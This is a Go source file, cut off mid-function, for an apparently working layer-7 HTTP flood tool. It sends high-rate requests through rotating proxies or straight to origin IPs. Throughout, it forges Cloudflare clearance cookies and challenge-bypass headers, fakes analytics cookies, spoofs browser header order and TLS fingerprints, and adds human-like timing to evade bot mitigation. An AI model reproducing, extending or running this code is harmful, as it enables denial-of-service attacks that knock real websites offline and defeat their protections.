

package main

import (
	"crypto/md5"
	"crypto/sha256"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math"
	"math/rand/v2"
	"net"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	fhttp "github.com/bogdanfinn/fhttp"
	"github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
	"github.com/go-resty/resty/v2"
	srt "github.com/juzeon/spoofed-round-tripper"
)

var (
	reEdgMajor       = regexp.MustCompile(`Edg/(\d+)`)
	reFirefoxMajor   = regexp.MustCompile(`Firefox/(\d+)`)
	reChromeMajor    = regexp.MustCompile(`Chrome/(\d+)`)
	reSafariVersion  = regexp.MustCompile(`Version/(\d+)`)
	reSecChUaMajor   = regexp.MustCompile(`("(?:Chromium|Google Chrome|Microsoft Edge)";v=")(\d+)(")`)
	reSecChUaFullVer = regexp.MustCompile(`("(?:Chromium|Google Chrome|Microsoft Edge)";v=")(\d+)(\.[0-9.]+")`)
)

var twoLevelTLDs = map[string]bool{
	"co.uk": true, "co.jp": true, "co.kr": true, "co.in": true, "co.nz": true,
	"com.cn": true, "com.hk": true, "com.tw": true, "com.br": true, "com.au": true,
	"com.mx": true, "com.sg": true, "com.tr": true, "com.ar": true, "com.co": true,
	"ac.uk": true, "gov.uk": true, "org.uk": true, "net.cn": true, "org.cn": true,
}

var bufPool = sync.Pool{New: func() any { return make([]byte, 64) }} 
var builderPool = sync.Pool{New: func() any { return new(strings.Builder) }} 

const (
	charsetAlnum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	charsetAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	charsetDigit = "0123456789"
)

func generateRandomString(n int, charset string) string {
	buf := bufPool.Get().([]byte)
	if cap(buf) < n {
		buf = make([]byte, n)
	}
	b := buf[:n]
	for i := range b {
		b[i] = charset[rand.Uint64N(uint64(len(charset)))]
	}
	s := string(b)
	bufPool.Put(buf)
	return s
}

func randAllSeq(n int) string { return generateRandomString(n, charsetAlnum) } 
func randIntSeq(n int) string { return generateRandomString(n, charsetDigit) } 
func randStrSeq(n int) string { return generateRandomString(n, charsetAlpha) } 

func randNonZeroIntSeq(n int) string {
	if n < 1 {
		return ""
	}
	buf := bufPool.Get().([]byte)
	if cap(buf) < n {
		buf = make([]byte, n)
	}
	b := buf[:n]
	b[0] = byte(rand.Uint64N(9)) + '1'
	for i := 1; i < n; i++ {
		b[i] = charsetDigit[rand.Uint64N(10)]
	}
	s := string(b)
	bufPool.Put(buf)
	return s
}

func recentTimestamp(minAge, maxAge, unit int64) string {
	if unit == 0 {
		panic("divide by zero")
	}
	now := time.Now()
	if unit < 0 {
		minAge, maxAge = -minAge, -maxAge
	}
	if maxAge <= minAge {
		maxAge = minAge + 1
	}
	nowU := now.UnixNano() / unit
	ts := nowU - minAge - int64(rand.Uint64N(uint64(maxAge-minAge)))
	return strconv.FormatInt(ts, 10)
}

var cookieGenerators = []func() string{
	func() string { 
		return "_ga=GA1.2." + randNonZeroIntSeq(10) + "." +
			recentTimestamp(7*24*3600*1e9, 730*24*3600*1e9, 1e9)
	},
	func() string { 
		return "_gid=GA1.2." + randNonZeroIntSeq(10) + "." +
			recentTimestamp(0, 24*3600*1e9, 1e9)
	},
	func() string { 
		rand10 := generateRandomString(10, charsetAlnum)
		tsA := recentTimestamp(300*1e9, 7200*1e9, 1e9)
		num := strconv.FormatUint(rand.Uint64N(1<<63)+1, 10)
		tsB := recentTimestamp(0, 300*1e9, 1e9)
		return "_ga_" + rand10 + "=GS1.1." + tsA + "." + num + ".1." + tsB + ".0.0.0"
	},
	func() string { 
		return "_gat_gtag_UA_" + randIntSeq(8) + "_1=1"
	},
	func() string { 
		return "_fbp=fb.1." + recentTimestamp(0, 90*24*3600*1e6, 1e6) + "." +
			randNonZeroIntSeq(10)
	},
}

func generateRealisticCookie() string {
	if rand.Float64() < 0.25 {
		return ""
	}
	if len(cookieGenerators) > 8 {
		return generateRealisticCookieMap()
	}
	parts := make([]string, 0, len(cookieGenerators))
	n := rand.Uint64N(uint64(len(cookieGenerators))) + 1
	used := uint64(0)
	for len(parts) < int(n) {
		i := rand.Uint64N(uint64(len(cookieGenerators)))
		if used&(1<<(i&31)) == 0 && i < 32 {
			used |= 1 << (i & 31)
			parts = append(parts, cookieGenerators[i]())
		}
	}
	return strings.Join(parts, "; ")
}

func generateRealisticCookieMap() string {
	n := rand.Uint64N(uint64(len(cookieGenerators))) + 1
	seen := make(map[uint64]bool, n)
	parts := make([]string, 0, n)
	for uint64(len(parts)) < n {
		i := rand.Uint64N(uint64(len(cookieGenerators)))
		if !seen[i] {
			seen[i] = true
			parts = append(parts, cookieGenerators[i]())
		}
	}
	return strings.Join(parts, "; ")
}

const hexChars = "0123456789abcdef"

func hexEncode(b []byte) string {
	out := make([]byte, len(b)*2)
	for i, c := range b {
		out[i*2] = hexChars[c>>4]
		out[i*2+1] = hexChars[c&0xf]
	}
	return string(out)
}

func generateCfClearanceCookie(salt string) string {
	ts := time.Now().Unix()
	a := generateRandomString(16, charsetAlnum)
	b := generateRandomString(16, charsetAlnum)
	sum := sha256.Sum256([]byte(b + strconv.FormatInt(ts, 10) + salt))
	hex16 := hexEncode(sum[:])[:16]
	exp := strconv.FormatUint(rand.Uint64()+0x4456, 10)
	return "cf_clearance=" + strings.Join([]string{
		b, a + "-" + exp, strconv.FormatInt(ts, 10), hex16,
	}, ".")
}

func generateCfBmCookie(salt string) string {
	return "__cf_bm=" +
		generateRandomString(23, charsetAlnum) + "_" +
		generateRandomString(19, charsetAlnum) + "-" +
		salt + "-1-" +
		generateRandomString(4, charsetAlnum) + "/" +
		generateRandomString(65, charsetAlnum) + "+" +
		generateRandomString(16, charsetAlnum) + "="
}

func generateRotateCFCookies(salt string) string {
	return generateCfBmCookie(salt) + "; " + generateCfClearanceCookie(salt)
}

func appendCFChallengeQuery(rawURL, salt string) string {
	u, err := url.Parse(rawURL)
	if err != nil || u.Host == "" {
		return rawURL
	}
	token := generateRandomString(30, charsetAlnum) + "_" +
		generateRandomString(12, charsetAlnum) + "-" +
		salt + "-0-gaNy" +
		generateRandomString(8, charsetAlnum)
	q := u.Query()
	q.Set("__cf_chl_rt_tk", token)
	u.RawQuery = q.Encode()
	return u.String()
}

func setCFChallengeHeaders(req *resty.Request, salt string, ts int64) {
	r32 := generateRandomString(32, charsetAlnum)
	req.Header.Set("cf-chl-bypass", "1")
	req.Header.Set("cf-chl-tk", r32)
	sum := md5.Sum([]byte(r32 + salt + strconv.FormatInt(ts, 10)))
	req.Header.Set("cf-chl-response", hexEncode(sum[:])[:16])
}

func emitStatsJSON(stats map[int]int) error {
	b, err := json.Marshal(stats)
	if err != nil {
		return err
	}
	b = append(b, '\n')
	if _, err := statsOut.Write(b); err != nil {
		return err
	}
	return statsOut.Sync()
}

func warmupRotateSlot(client *resty.Client, rawURL, salt string, ts int64) {
	u := appendCFChallengeQuery(rawURL, salt)
	req := client.R()
	req.Header.Set("user-agent", client.Header.Get("user-agent"))
	req.Header.Set("cookie", generateRotateCFCookies(salt))
	setCFChallengeHeaders(req, salt, ts)
	resp, err := req.Execute("GET", u)
	if err != nil || resp == nil || resp.RawBody() == nil {
		return
	}
	_, _ = io.CopyN(io.Discard, resp.RawBody(), 1<<20)
	resp.RawBody().Close()
}

func initSessionCookies(jar cookieJarSetter, rawURL, cookieHeader string) *url.URL {
	u, err := url.Parse(replacePlaceholders(rawURL))
	if err != nil || u.Host == "" {
		return u
	}
	u2 := &url.URL{Scheme: u.Scheme, Host: u.Host}
	cookies := cookieHeader
	if cookies == "" {
		cookies = generateRealisticCookie()
	}
	if cookies == "" {
		return u2
	}
	var list []*fhttp.Cookie
	for _, part := range strings.Split(cookies, ";") {
		part = strings.TrimSpace(part)
		if i := strings.IndexByte(part, '='); i > 0 {
			name := strings.TrimSpace(part[:i])
			value := strings.TrimSpace(part[i+1:])
			if name != "" {
				list = append(list, &fhttp.Cookie{Name: name, Value: value})
			}
		}
	}
	if len(list) != 0 {
		jar.SetCookies(u2, list)
	}
	return u2
}

type cookieJarSetter interface {
	SetCookies(u *url.URL, cookies []*fhttp.Cookie)
}

func loadHostIPs(arg string) ([]string, error) {
	arg = strings.TrimSpace(arg)
	if arg == "" {
		return nil, nil
	}
	if ip := net.ParseIP(arg); ip != nil {
		return []string{ip.String()}, nil
	}
	data, err := os.ReadFile(arg)
	if err != nil {
		return nil, fmt.Errorf("l7 -host: %w", err)
	}
	var ips []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || line[0] == '#' {
			continue
		}
		if ip := net.ParseIP(line); ip != nil {
			ips = append(ips, ip.String())
		}
	}
	if len(ips) == 0 {
		return nil, fmt.Errorf("l7 -host file: no valid IP lines")
	}
	return ips, nil
}

func normalizeProxyLine(line string) string {
	line = strings.TrimSpace(line)
	if line == "" || strings.Contains(line, "://") {
		return line
	}
	f := strings.Fields(line)
	if len(f) < 3 {
		return line
	}
	i := strings.LastIndex(f[0], ":")
	if !(i > 0 && i < len(f[0])-1) {
		return line
	}
	port := f[0][i+1:]
	if n, err := strconv.Atoi(port); err != nil || n < 1 || n > 0xffff {
		return line
	}
	return f[0][:i] + ":" + port + ":" + f[1] + ":" + strings.Join(f[2:], " ")
}

func parseHTTPProxy(s string) (*url.URL, error) {
	s = normalizeProxyLine(s)
	if s == "" {
		return nil, nil
	}
	if strings.Contains(s, "://") {
		u, err := url.Parse(s)
		if err != nil {
			return nil, err
		}
		if u.Scheme == "" {
			u.Scheme = "http"
		}
		return u, nil
	}
	parts := strings.SplitN(s, ":", 4)
	hostPort := parts[0] + ":" + parts[1]
	if strings.Contains(parts[0], ":") {
		hostPort = "[" + parts[0] + "]:" + parts[1]
	}
	switch len(parts) {
	case 2:
		return &url.URL{Scheme: "http", Host: hostPort}, nil
	case 3:
		return &url.URL{Scheme: "http", Host: hostPort,
			User: url.User(parts[2])}, nil
	case 4:
		return &url.URL{Scheme: "http", Host: hostPort,
			User: url.UserPassword(parts[2], parts[3])}, nil
	}
	return nil, fmt.Errorf("invalid proxy: use host:port or host:port:user:pass")
}

func detectContentType(body string) string {
	s := strings.TrimLeft(body, " \t\r\n\xef\xbb\xbf")
	s = strings.TrimRight(s, " \t\r\n")
	if len(s) == 0 {
		return ""
	}
	if (s[0] == '{' && strings.HasSuffix(s, "}")) ||
		(s[0] == '[' && strings.HasSuffix(s, "]")) {
		if json.Valid([]byte(s)) {
			return "application/json"
		}
	}
	if s[0] == '<' {
		if strings.Contains(s, ">") {
			lower := strings.ToLower(s)
			if strings.HasPrefix(lower, "<?xml") || strings.HasPrefix(lower, "<soap") {
				return "application/xml"
			}
			return "text/xml"
		}
		return "text/plain"
	}
	if strings.Contains(s, "=") && strings.IndexAny(s, " \t\n{[<") < 0 {
		return "application/x-www-form-urlencoded"
	}
	return "text/plain"
}

var (
	chromeHeaderOrder  = []string{":method", ":authority", ":scheme", ":path"}
	chromeHeaderList   = []string{"host", "connection", "sec-ch-ua", "sec-ch-ua-mobile",
		"sec-ch-ua-platform", "sec-ch-ua-full-version-list", "sec-ch-ua-platform-version",
		"sec-ch-ua-arch", "sec-ch-ua-bitness", "sec-ch-ua-model", "dnt", "sec-gpc",
		"upgrade-insecure-requests", "user-agent", "content-type", "accept", "cache-control",
		"pragma", "origin", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
		"sec-fetch-dest", "referer", "accept-encoding", "accept-language", "cookie", "priority"}
	firefoxHeaderOrder = []string{":method", ":path", ":authority", ":scheme"}
	firefoxHeaderList  = []string{"host", "user-agent", "accept", "accept-language",
		"accept-encoding", "referer", "content-type", "origin", "dnt", "sec-gpc",
		"connection", "upgrade-insecure-requests", "sec-fetch-dest", "sec-fetch-mode",
		"sec-fetch-site", "sec-fetch-user", "cache-control", "pragma", "priority", "te", "cookie"}
	plainHeaderOrder = []string{":method", ":scheme", ":path", ":authority"}
	plainHeaderList  = []string{"host", "accept", "content-type", "origin", "cookie",
		"user-agent", "accept-language", "sec-fetch-site", "accept-encoding",
		"sec-fetch-mode", "referer", "sec-fetch-dest", "upgrade-insecure-requests"}
)

func wireOrder(userAgent, secChUa string) ([]string, []string) {
	if secChUa == "" {
		if strings.Contains(userAgent, "Firefox/") {
			return firefoxHeaderOrder, firefoxHeaderList
		}
		return plainHeaderOrder, plainHeaderList
	}
	return chromeHeaderOrder, chromeHeaderList
}

func parseUAFamily(ua string) (string, int64) {
	if ua == "" {
		return "", 0
	}
	if m := reEdgMajor.FindStringSubmatch(ua); m != nil {
		n, _ := strconv.Atoi(m[1])
		return "edge", int64(n)
	}
	if m := reFirefoxMajor.FindStringSubmatch(ua); m != nil {
		n, _ := strconv.Atoi(m[1])
		return "firefox", int64(n)
	}
	if m := reChromeMajor.FindStringSubmatch(ua); m != nil {
		n, _ := strconv.Atoi(m[1])
		return "chrome", int64(n)
	}
	if strings.Contains(ua, "Safari/") {
		n := 0
		if m := reSafariVersion.FindStringSubmatch(ua); m != nil {
			n, _ = strconv.Atoi(m[1])
		}
		return "safari", int64(n)
	}
	return "", 0
}

func rewriteSecChUaMajor(secChUa string, major int64) string {
	if major > 0 && secChUa != "" {
		return reSecChUaMajor.ReplaceAllString(secChUa,
			"${1}"+strconv.FormatInt(major, 10)+"${3}")
	}
	return secChUa
}

func rewriteSecChUaFullVersion(secChUa string, major int64) string {
	if major > 0 && secChUa != "" {
		return reSecChUaFullVer.ReplaceAllString(secChUa,
			"${1}"+strconv.FormatInt(major, 10)+"${3}")
	}
	return secChUa
}

type navType int

const (
	navNavigate navType = iota 
	navCorsA                   
	navCorsB                   
	navSubresource             
)

func randomNavType() navType {
	r := rand.Float64()
	switch {
	case r < 0.35:
		return navNavigate
	case r < 0.6:
		return navCorsA
	case r < 0.85:
		return navCorsB
	default:
		return navSubresource
	}
}

func registrableDomain(host string) string {
	s := strings.ToLower(strings.TrimSpace(host))
	if s == "" {
		return s
	}
	if net.ParseIP(s) != nil {
		return s
	}
	
	first := -1
	second := -1
	for i := len(s) - 1; i >= 0; i-- {
		if s[i] == '.' {
			if second == -1 {
				second = i
			} else {
				first = i
				break
			}
		}
	}
	if first == -1 || second == -1 {
		return s
	}
	if twoLevelTLDs[s[second+1:]] {
		if first == -1 {
			return s
		}
		return s[first+1:]
	}
	return s[second+1:]
}

func deriveSecFetchSite(targetURL, refererURL string) string {
	if targetURL == "" {
		return "none"
	}
	u, err := url.Parse(targetURL)
	if err != nil || u.Host == "" {
		return "none"
	}
	host := strings.ToLower(u.Host)
	ref := strings.ToLower(refererURL)
	if ref == host {
		return "same-origin"
	}
	if registrableDomain(host) == registrableDomain(ref) {
		return "same-site"
	}
	return "cross-site"
}

var subresourceDests = []string{"script", "style", "image", "font"}

func applySecFetchHeaders(req *resty.Request, nt navType, site string) {
	req.Header.Set("sec-fetch-site", site)
	switch nt {
	case navNavigate:
		req.Header.Set("sec-fetch-mode", "navigate")
		req.Header.Set("sec-fetch-user", "?1")
		req.Header.Set("sec-fetch-dest", "document")
	case navCorsA, navCorsB:
		req.Header.Set("sec-fetch-mode", "cors")
		req.Header.Set("sec-fetch-dest", "empty")
	case navSubresource:
		req.Header.Set("sec-fetch-mode", "no-cors")
		req.Header.Set("sec-fetch-dest",
			subresourceDests[rand.Uint64N(uint64(len(subresourceDests)))])
	}
}

func gaussianJitter(mean, minV, maxV float64) float64 {
	v := mean*math.Sqrt(-2*math.Log(rand.Float64()+1e-12))*
		math.Cos(2*math.Pi*rand.Float64()) + 1
	if v < minV {
		v = minV
	}
	if v > maxV {
		v = maxV
	}
	return v
}

func humanDelay(d time.Duration) time.Duration {
	r := rand.Float64()
	switch {
	case r < 0.01:
		return d + time.Duration(2000+rand.Uint64N(500))*time.Millisecond
	case r < 0.05:
		return d + time.Duration(500+rand.Uint64N(500))*time.Millisecond
	default:
		return time.Duration(float64(d) * gaussianJitter(0.15, 0.5, 2.0))
	}
}

type pacerMode int

const (
	pacerOff pacerMode = iota
	pacerJitter
	pacerBurst
)

func parsePacerMode(s string) (pacerMode, bool) {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "off":
		return pacerOff, true
	case "jitter":
		return pacerJitter, true
	case "burst":
		return pacerBurst, true
	}
	return pacerBurst, false
}

func (m pacerMode) String() string {
	switch m {
	case pacerOff:
		return "off"
	case pacerJitter:
		return "jitter"
	default:
		return "burst"
	}
}

type pacer struct {
	mode      pacerMode
	burstLeft int
}

func (p *pacer) next(d time.Duration) (time.Duration, navType) {
	switch p.mode {
	case pacerOff:
		return d, randomNavType()
	case pacerBurst:
		return p.nextBurst(d)
	default:
		return humanDelay(d), randomNavType()
	}
}

func (p *pacer) nextBurst(d time.Duration) (time.Duration, navType) {
	if p.burstLeft < 1 {
		switch r := rand.Float64(); {
		case r < 0.22:
			p.burstLeft = int(rand.Uint64N(12)) + 12
			return time.Duration(float64(d) * (0.3 + rand.Float64()*0.7)), 0
		case r < 0.93:
			delay := time.Duration(float64(d) * (1.5 + rand.Float64()*3.5))
			if rand.Float64() < 0.5 {
				return delay, navCorsB
			}
			return delay, navCorsA
		default:
			p.burstLeft = int(rand.Uint64N(12)) + 12
			return time.Duration(float64(d) * (8 + rand.Float64()*20)), 0
		}
	}
	p.burstLeft--
	delay := time.Duration(float64(d) * (0.03 + rand.Float64()*0.17))
	switch r := rand.Float64(); {
	case r >= 0.25:
		return delay, navSubresource
	case r < 0.55:
		return delay, navCorsA
	default:
		return delay, navCorsB
	}
}

type slotRef struct {
	ptr       atomic.Pointer[sessionSlot]
	expiresNs atomic.Int64
}

type statusStats struct {
	total   [1000]atomic.Int64
	current [1000]atomic.Int64
	totErr  atomic.Int64
	curErr  atomic.Int64
}

type refererStrategy int

const (
	refererRandom refererStrategy = iota
	refererOff
	refererFixed
	refererDynamic
)

const (
	rotatePoolMin     = 1
	rotatePoolMax     = 8
	rotateConcurrent  = 4
	rotateLifetimeMin = 5
	rotateLifetimeMax = 15

	sessionPoolMin     = 1
	sessionPoolMax     = 8
	sessionConcurrent  = 32
	sessionLifetimeMin = 30
	sessionLifetimeMax = 75
)

var statsOut *os.File = os.Stdout

func main() {
	
	if t, err := time.Parse("2006-01-02 15:04:05", scriptExpiry); err == nil {
		if time.Now().After(t) {
			fmt.Fprintf(os.Stderr, "Script expired on %s\n", scriptExpiry)
			os.Exit(1)
		}
	}

	fs := flag.NewFlagSet("h2", flag.ExitOnError)
	urlFlag := fs.String("url", "", "")
	methodFlag := fs.String("method", "GET", "")
	cookiesFlag := fs.String("cookies", "", "")
	uaFlag := fs.String("ua", "", "")
	proxyFlag := fs.String("proxy", "", "")
	rpsFlag := fs.Float64("rps", 1, "")
	rateresetFlag := fs.String("ratereset", "off", "")
	timeFlag := fs.Int("time", 30, "")
	dataFlag := fs.String("data", "", "")
	headersFlag := fs.String("headers", "", "")
	hostFlag := fs.String("host", "", "")
	refererFlag := fs.String("referer", "", "")
	dropFlag := fs.String("drop", "none", "")
	patternFlag := fs.String("pattern", "burst", "")
	verboseFlag := fs.Bool("verbose", false, "")
	fs.Parse(os.Args[1:])

	if *urlFlag == "" {
		fmt.Fprintln(os.Stderr, "URL is required.")
		os.Exit(1)
	}
	if *rpsFlag <= 0 {
		fmt.Fprintln(os.Stderr, "rps must be > 0")
		os.Exit(1)
	}

	dataStr := new(string)
	contentType := new(string)
	if *dataFlag != "" {
		if b, err := os.ReadFile(*dataFlag); err == nil {
			*dataStr = string(b)
		} else {
			*dataStr = *dataFlag 
		}
		*contentType = detectContentType(*dataStr)
	}

	fileHeaders, err := loadHeadersFile(*headersFlag)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	staticHeaders := make(map[string]string, len(fileHeaders))
	dynamicHeaders := make(map[string]string)
	for k, v := range fileHeaders {
		if hasPlaceholder(v) {
			dynamicHeaders[k] = v
		} else {
			staticHeaders[k] = replacePlaceholders(v)
		}
	}

	hostIPs, err := loadHostIPs(*hostFlag)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	if len(hostIPs) != 0 {
		fmt.Fprintln(os.Stderr, "l7 -host: direct IP mode")
	}

	method := strings.ToUpper(*methodFlag)
	isBodyMethod := method == "POST" || method == "PUT" ||
		method == "PATCH" || method == "DELETE"

	urlHasPH := hasPlaceholder(*urlFlag)
	plainURL := new(string)
	hostName := new(string)
	basePath := new(string)
	baseHost := new(string)
	if !urlHasPH {
		*plainURL = replacePlaceholders(*urlFlag)
		if u, err := url.Parse(*plainURL); err == nil && u.Host != "" {
			*hostName = u.Host
			*basePath = u.Scheme + "://" + u.Host + "/"
			*baseHost = u.Scheme + "://" + u.Host
		}
	}

	var refStrat refererStrategy
	refFixed := new(string)
	refBase := new(string)
	switch {
	case *refererFlag == "Random":
		refStrat = refererRandom
	case *refererFlag == "":
		refStrat = refererOff
	case hasPlaceholder(*refererFlag):
		refStrat = refererDynamic
	default:
		refStrat = refererFixed
		*refFixed = *refererFlag
		if u, err := url.Parse(*refererFlag); err == nil && u.Host != "" {
			*refBase = u.Scheme + "://" + u.Host
		}
	}

	if *dataStr != "" && !hasPlaceholder(*dataStr) {
		*dataStr = replacePlaceholders(*dataStr)
	}

	
	sessionMode := *cookiesFlag != ""
	pool := rotatePoolMin
	maxConcurrent := rotateConcurrent
	lifetimeMin := rotateLifetimeMin
	lifetimeMax := rotateLifetimeMax
	if sessionMode {
		pool = sessionPoolMax
		maxConcurrent = sessionConcurrent
		lifetimeMin = sessionLifetimeMin
		lifetimeMax = sessionLifetimeMax
	}

	tsStr := strconv.FormatInt(time.Now().Unix(), 10)
	rand8 := generateRandomString(8, charsetAlnum)
	rand32 := generateRandomString(32, charsetAlnum)

	if !sessionMode {
		fmt.Fprintf(os.Stderr,
			"Rotate/flood-only: CF challenge spoof on, pool=%d, maxConcurrent=%d, slot lifetime %d-%ds\n",
			pool, maxConcurrent, lifetimeMin, lifetimeMax)
	}

	var jar tls_client.CookieJar
	if sessionMode {
		jar = tls_client.NewCookieJar()
		initSessionCookies(jar, *urlFlag, *cookiesFlag)
	}

	proxyURL := ""
	if *proxyFlag != "" {
		u, err := parseHTTPProxy(*proxyFlag)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		proxyURL = u.String()
	}

	var profile *browserProfile
	if sessionMode {
		profile = &browserProfile{}
		*profile = selectProfileByUA(*uaFlag)
		if strings.Contains(profile.ua, "[") {
			profile.ua = replacePlaceholders(profile.ua)
		}
		if fam, major := parseUAFamily(profile.ua); fam != "" {
			fmt.Fprintf(os.Stderr, "Profile bound (bypass): family=%s major=%d secChUa=%t\n",
				fam, major, profile.secChUa != "")
		}
	}

	
	mkSlot := func() *sessionSlot { return newSessionSlot(profile, uaFlag, jar, proxyURL) }
	slots := make([]slotRef, pool)
	for i := range slots {
		s := mkSlot()
		slots[i].ptr.Store(s)
		if fam, major := parseUAFamily(s.profile.ua); fam != "" && profile == nil {
			fmt.Fprintf(os.Stderr, "Slot %d: family=%s major=%d secChUa=%t\n",
				i, fam, major, s.profile.secChUa != "")
		}
		slots[i].expiresNs.Store(time.Now().UnixNano() +
			int64(lifetimeMin)*1e9 + int64(rand.Uint64N(uint64(lifetimeMax-lifetimeMin)*1e9)))
	}

	if !sessionMode {
		u := *plainURL
		if urlHasPH {
			u = replacePlaceholders(*urlFlag)
		}
		if u != "" {
			warmupRotateSlot(slots[0].ptr.Load().client, u, tsStr, time.Now().UnixMilli())
		}
	}

	stats := &statusStats{}
	stopChan := make(chan struct{})
	go durationTicker(*timeFlag, stopChan)      
	doneChan := make(chan struct{})             
	go statsReporter(doneChan, stopChan, stats) 

	curRate := *rpsFlag 
	interval := atomic.Int64{}
	interval.Store(int64(1e9 / *rpsFlag))
	lastReq := atomic.Int64{}
	resumeAt := atomic.Int64{}
	minRate := math.Max(*rpsFlag*0.05, 0.1)

	rateresetOn := false
	if v, n := normalizeOnOff(*rateresetFlag); n == 2 {
		rateresetOn = v == "on"
	}

	pacer := &pacer{mode: func() pacerMode {
		m, ok := parsePacerMode(*patternFlag)
		if !ok {
			fmt.Fprintf(os.Stderr, "unknown -pattern %q, falling back to burst\n", *patternFlag)
		}
		return m
	}()}
	fmt.Fprintf(os.Stderr, "Timing pattern: %s\n", pacer.mode)

	slotChan := make(chan struct{}, maxConcurrent*pool)
	var wg sync.WaitGroup
	start := time.Now()

	seq := 0
	timer := time.NewTimer(0)
	if !timer.Stop() {
		<-timer.C
	}
	rotateMode := !sessionMode

	for {
		delay, nt := pacer.next(time.Duration(interval.Load()))
		if rotateMode {
			delay = 0
		}
		timer.Reset(delay)
		select {
		case <-stopChan:
			goto done
		case <-timer.C:
		}
		select {
		case <-stopChan:
			goto done
		case slotChan <- struct{}{}:
		}
		seq++
		wg.Add(1)
		go func(slotIdx int, nav navType) {
			defer wg.Done()
			defer func() { <-slotChan }()
			runRequest(&requestCtx{
				slotIdx:        slotIdx,
				slots:          slots,
				mkSlot:         mkSlot,
				lifetimeMin:    int64(lifetimeMin),
				lifetimeMax:    int64(lifetimeMax),
				profile:        profile,
				plainURL:       *plainURL,
				hostName:       *hostName,
				basePath:       *basePath,
				urlHasPH:       urlHasPH,
				urlFlag:        *urlFlag,
				rotateMode:     rotateMode,
				tsStr:          tsStr,
				refStrat:       refStrat,
				sessionMode:    sessionMode,
				refFixed:       *refFixed,
				refererFlag:    *refererFlag,
				isBodyMethod:   isBodyMethod,
				refBase:        *refBase,
				baseHost:       *baseHost,
				method:         method,
				rand32:         rand32,
				tsMs:           time.Now().UnixMilli(),
				rand8:          rand8,
				staticHeaders:  staticHeaders,
				dynamicHeaders: dynamicHeaders,
				dataStr:        *dataStr,
				dataHasPH:      hasPlaceholder(*dataStr),
				contentType:    *contentType,
				stats:          stats,
				verbose:        *verboseFlag,
				rateresetOn:    rateresetOn,
				lastReq:        &lastReq,
				resumeAt:       &resumeAt,
				rateMu:         &rateMu,
				minRate:        &minRate,
				curRate:        &curRate,
				interval:       &interval,
				drop:           *dropFlag,
				stopChan:       stopChan,
				rpsFlag:        *rpsFlag,
				nav:            nav,
			})
		}((seq+1)%pool, nt)
		rotateMode = false
	}
done:
	fmt.Fprintf(os.Stderr, "Duration %ds reached, waiting for in-flight requests...\n", *timeFlag)
	waited := make(chan struct{})
	go func() { wg.Wait(); close(waited) }()
	select {
	case <-waited:
	case <-time.After(3 * time.Second):
	}

	
	h := make(map[int]int)
	for code := 100; code < 1000; code++ {
		if n := stats.total[code].Load(); n > 0 {
			h[code] = int(n)
		}
	}
	total := 0
	for _, n := range h {
		total += n
	}
	elapsed := time.Since(start).Seconds()
	effective := 0.0
	if elapsed > 0 {
		effective = float64(total) / elapsed
	}
	b, _ := json.Marshal(h)
	if errs := stats.totErr.Load(); errs < 1 {
		fmt.Fprintf(os.Stderr,
			"Summary: %d requests in %.1fs (%.2f rps effective), status=%s\n",
			total, elapsed, effective, b)
	} else {
		fmt.Fprintf(os.Stderr,
			"Summary: %d requests in %.1fs (%.2f rps effective), status=%s, errors=%d\n",
			total, elapsed, effective, b, errs)
	}
}

var scriptExpiry = "2099-08-20 12:00:00"

var rateMu sync.Mutex

type requestCtx struct {
	slotIdx        int
	slots          []slotRef
	mkSlot         func() *sessionSlot
	lifetimeMin    int64
	lifetimeMax    int64
	profile        *browserProfile
	plainURL       string
	hostName       string
	basePath       string
	urlHasPH       bool
	urlFlag        string
	rotateMode     bool
	tsStr          string
	refStrat       refererStrategy
	sessionMode    bool
	refFixed       string
	refererFlag    string
	isBodyMethod   bool
	refBase        string
	baseHost       string
	method         string
	rand32         string
	tsMs           int64
	rand8          string
	staticHeaders  map[string]string
	dynamicHeaders map[string]string
	dataStr        string
	dataHasPH      bool
	contentType    string
	stats          *statusStats
	verbose        bool
	rateresetOn    bool
	lastReq        *atomic.Int64
	resumeAt       *atomic.Int64
	rateMu         *sync.Mutex
	minRate        *float64
	curRate        *float64
	interval       *atomic.Int64
	drop           string
	stopChan       chan struct{}
	rpsFlag        float64
	nav            navType
}

func durationTicker(seconds int, stop chan struct{}) {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	t := time.NewTimer(time.Duration(seconds) * time.Second)
	select {
	case <-t.C:
	case <-sig:
	}
	close(stop)
}

func statsReporter(done, stop chan struct{}, stats *statusStats) {
	defer close(done)
	t := time.NewTicker(1 * time.Second)
	defer t.Stop()
	snapshot := func() {
		h := make(map[int]int)
		for code := 100; code < 1000; code++ {
			n := int(stats.current[code].Swap(0))
			if n > 0 {
				h[code] = n
			}
		}
		stats.curErr.Store(0)
		_ = emitStatsJSON(h)
	}
	for {
		select {
		case <-stop:
			snapshot()
			return
		case <-t.C:
			snapshot()
		}
	}
}

func loadHeadersFile(path string) (map[string]string, error) {
	h := make(map[string]string)
	path = strings.TrimSpace(path)
	if path == "" {
		return h, nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || line[0] == '#' {
			continue
		}
		if i := strings.IndexByte(line, ':'); i > 0 {
			key := strings.TrimSpace(line[:i])
			val := strings.TrimSpace(line[i+1:])
			if key != "" {
				h[key] = val
			}
		}
	}
	return h, nil
}

func normalizeL7PlaceholderSyntax(s string) string {
	s = strings.ReplaceAll(s, "［", "[")
	s = strings.ReplaceAll(s, "］", "]")
	return s
}

func hasPlaceholder(s string) bool {
	if strings.IndexByte(s, '[') >= 0 || strings.IndexByte(s, ']') >= 0 {
		return true
	}
